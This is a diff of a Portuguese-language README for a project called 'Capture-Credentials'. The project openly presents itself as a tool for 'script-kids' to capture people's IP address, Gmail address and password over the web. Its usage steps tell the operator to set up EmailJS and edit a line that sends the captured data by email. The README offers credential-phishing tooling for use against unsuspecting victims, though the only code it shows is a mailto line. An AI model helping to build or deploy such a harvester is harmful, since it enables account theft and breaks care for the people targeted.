@@ -1,3 +1,10 @@
 # Capture-Credentials
-Esse projeto será capaz de capturar e-mails e senhas locas atráves de uma rede wifi.
-E detecta sobre se a conta tem uma two-steps verificação
+Esse projeto é como um jackpot para "script-kids" já que é de preferência duvidosa, pode ser usado em uma via Web para capturar identificadores. 
+Endereço IP
+Gmail
+Senha 
+# Como usar?
+   Crie uma conta no EmailJS (https://www.emailjs.com/) 
+Substitua no código 
+   // Abre o cliente de e-mail do usuário com os dados preenchidos
+    window.location.href = `mailto:seuemail@example.com?subject=Contato&body=${encodeURIComponent(corpoEmail)}`;
